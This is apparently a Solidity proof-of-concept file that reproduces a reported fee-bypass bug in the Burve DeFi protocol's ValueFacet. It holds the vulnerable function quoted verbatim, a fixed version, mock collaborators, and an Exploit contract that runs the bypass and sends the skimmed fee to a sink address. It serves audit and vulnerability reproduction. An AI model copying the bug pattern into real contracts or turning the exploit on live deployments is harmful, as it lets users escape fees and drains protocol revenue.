// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

// =============================================================================
//  Minimal faithful reproduction of the Burve H-6 fee bypass
//  (sherlock 2025-04-burve, ValueFacet.sol L214-245).
//
//  The load-bearing vulnerable lines of ValueFacet.removeValueSingle are
//  reproduced VERBATIM below (marked @>). The surrounding closure / vertex /
//  adjustor collaborators are reduced to faithful minimal doubles so the exact
//  vulnerable fee computation runs unmodified.
//
//  Bug: `realTax` is prorated from `removedBalance`, but `removedBalance` (the
//  named return) is still 0 at that point — it is only assigned on the NEXT
//  line. So `realTax == mulDiv(0, nominalTax, removedNominal) == 0` for every
//  single-token removal: the protocol collects 0 fee and the remover keeps the
//  full amount (100% fee bypass).
// =============================================================================

/*//////////////////////////////////////////////////////////////
            FullMath.mulDiv — the real Uniswap 512-bit muldiv
//////////////////////////////////////////////////////////////*/
library FullMath {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        unchecked {
            uint256 prod0;
            uint256 prod1;
            assembly {
                let mm := mulmod(a, b, not(0))
                prod0 := mul(a, b)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }
            if (prod1 == 0) {
                require(denominator > 0);
                assembly {
                    result := div(prod0, denominator)
                }
                return result;
            }
            require(denominator > prod1);
            uint256 remainder;
            assembly {
                remainder := mulmod(a, b, denominator)
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }
            uint256 twos = denominator & (~denominator + 1);
            assembly {
                denominator := div(denominator, twos)
                prod0 := div(prod0, twos)
                twos := add(div(sub(0, twos), twos), 1)
            }
            prod0 |= prod1 * twos;
            uint256 inv = (3 * denominator) ^ 2;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            result = prod0 * inv;
            return result;
        }
    }
}

/*//////////////////////////////////////////////////////////////
                    Minimal real ERC20 (the token)
//////////////////////////////////////////////////////////////*/
contract Token {
    string public name = "Backing";
    string public symbol = "BCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
        TransferHelper.safeTransfer (as used by the facet)
//////////////////////////////////////////////////////////////*/
library TransferHelper {
    function safeTransfer(address token, address to, uint256 value) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "ST");
    }
}

/*//////////////////////////////////////////////////////////////
   Closure double — the accounting engine the facet delegates to.
   - removeValueSingle returns the nominal amount out + the nominal fee.
   - addEarnings accumulates the protocol's collected fee (the harm probe:
     it stays 0 under the bug because realTax is always 0).
//////////////////////////////////////////////////////////////*/
contract Closure {
    uint256 public earnings; // protocol fees actually booked
    uint256 public nominalOut;
    uint256 public nominalTaxOut;

    function set(uint256 _out, uint256 _tax) external {
        nominalOut = _out;
        nominalTaxOut = _tax;
    }

    function removeValueSingle(uint128, /*value*/ uint128, /*bgtValue*/ uint256 /*vid*/ )
        external
        view
        returns (uint256 removedNominal, uint256 nominalTax)
    {
        return (nominalOut, nominalTaxOut);
    }

    function addEarnings(uint256, /*vid*/ uint256 realTax) external {
        earnings += realTax;
    }
}

/*//////////////////////////////////////////////////////////////
        Vertex double — Store.vertex(vid).withdraw bookkeeping
//////////////////////////////////////////////////////////////*/
contract Vertex {
    uint256 public reserve;

    function fund(uint256 amt) external {
        reserve += amt;
    }

    function withdraw(uint256, /*cid*/ uint256 amount, bool /*flag*/ ) external {
        reserve -= amount; // trims the tracked reserve before the token payout
    }
}

/*//////////////////////////////////////////////////////////////
        AdjustorLib.toReal — nominal→real units (1:1 here)
//////////////////////////////////////////////////////////////*/
library AdjustorLib {
    function toReal(address, /*token*/ uint256 nominal, bool /*roundUp*/ ) internal pure returns (uint256) {
        return nominal;
    }
}

/*//////////////////////////////////////////////////////////////
   ValueFacet — VULNERABLE. removeValueSingle reproduced with the
   verbatim bug: realTax is prorated from `removedBalance`, which is
   the named return and is still 0 at this point.
//////////////////////////////////////////////////////////////*/
contract ValueFacet {
    Token public immutable token;
    Closure public immutable c;
    Vertex public immutable vertex;

    error PastSlippageBounds();

    constructor(Token _token, Closure _c, Vertex _vertex) {
        token = _token;
        c = _c;
        vertex = _vertex;
    }

    function removeValueSingle(
        address recipient,
        uint16, /*_closureId*/
        uint128 value,
        uint128 bgtValue,
        address, /*token_*/
        uint128 minReceive
    ) external returns (uint256 removedBalance) {
        uint256 vid = 0;
        (uint256 removedNominal, uint256 nominalTax) = c.removeValueSingle(value, bgtValue, vid);
        uint256 realRemoved = AdjustorLib.toReal(address(token), removedNominal, false);
        vertex.withdraw(0, realRemoved, false);
        // @> BUG: `removedBalance` is the named return and is still 0 here; it
        // @> should be `realRemoved`. So realTax == mulDiv(0, ...) == 0 always.
        uint256 realTax = FullMath.mulDiv(
            removedBalance, // @> should be realRemoved
            nominalTax,
            removedNominal
        );
        c.addEarnings(vid, realTax);
        removedBalance = realRemoved - realTax;
        require(removedBalance >= minReceive, PastSlippageBounds());
        TransferHelper.safeTransfer(address(token), recipient, removedBalance);
    }
}

/*//////////////////////////////////////////////////////////////
   ValueFacetFixed — the mitigation (realRemoved as the numerator),
   used by the registry control test to show the correct fee IS taken.
//////////////////////////////////////////////////////////////*/
contract ValueFacetFixed {
    Token public immutable token;
    Closure public immutable c;
    Vertex public immutable vertex;

    error PastSlippageBounds();

    constructor(Token _token, Closure _c, Vertex _vertex) {
        token = _token;
        c = _c;
        vertex = _vertex;
    }

    function removeValueSingle(
        address recipient,
        uint16, /*_closureId*/
        uint128 value,
        uint128 bgtValue,
        address, /*token_*/
        uint128 minReceive
    ) external returns (uint256 removedBalance) {
        uint256 vid = 0;
        (uint256 removedNominal, uint256 nominalTax) = c.removeValueSingle(value, bgtValue, vid);
        uint256 realRemoved = AdjustorLib.toReal(address(token), removedNominal, false);
        vertex.withdraw(0, realRemoved, false);
        uint256 realTax = FullMath.mulDiv(realRemoved, nominalTax, removedNominal); // FIX
        c.addEarnings(vid, realTax);
        removedBalance = realRemoved - realTax;
        require(removedBalance >= minReceive, PastSlippageBounds());
        TransferHelper.safeTransfer(address(token), recipient, removedBalance);
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — single-tx reproduction for the EVM Playground.
   run(): a remover pulls a single-token position out of the facet and
   pays ZERO fee. The bypassed fee (what the protocol should have booked)
   is forwarded to a sink so the measured profit == the fee stolen.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // bypassed-fee sink

    // Scenario: a single-token removal of 100 nominal with a 5% (5 nominal) fee.
    uint256 internal constant REMOVED_NOMINAL = 100e18;
    uint256 internal constant NOMINAL_TAX = 5e18;

    Token public token;
    Closure public closure;
    Vertex public vertex;
    ValueFacet public facet;

    function run() external payable {
        token = new Token();
        closure = new Closure();
        vertex = new Vertex();
        facet = new ValueFacet(token, closure, vertex);

        // The facet custodies the closure's backing so it can pay out.
        token.mint(address(facet), 1_000e18);
        vertex.fund(1_000e18);
        closure.set(REMOVED_NOMINAL, NOMINAL_TAX);

        // The remover (this contract) withdraws a single token. Under the bug
        // the fee is never charged: it receives the full realRemoved.
        uint256 got = facet.removeValueSingle(address(this), 1, uint128(REMOVED_NOMINAL), 0, address(token), 0);

        // The fee that SHOULD have been charged (mitigation numerator = realRemoved).
        uint256 fairTax = FullMath.mulDiv(got, NOMINAL_TAX, REMOVED_NOMINAL); // = 5e18
        uint256 fairAmount = REMOVED_NOMINAL - fairTax; // what an honest remover keeps
        uint256 skimmed = got - fairAmount; // the bypassed fee == 5e18

        // Forward exactly the bypassed fee to the sink so measured profit == fee stolen.
        token.transfer(SINK, skimmed);
    }
}
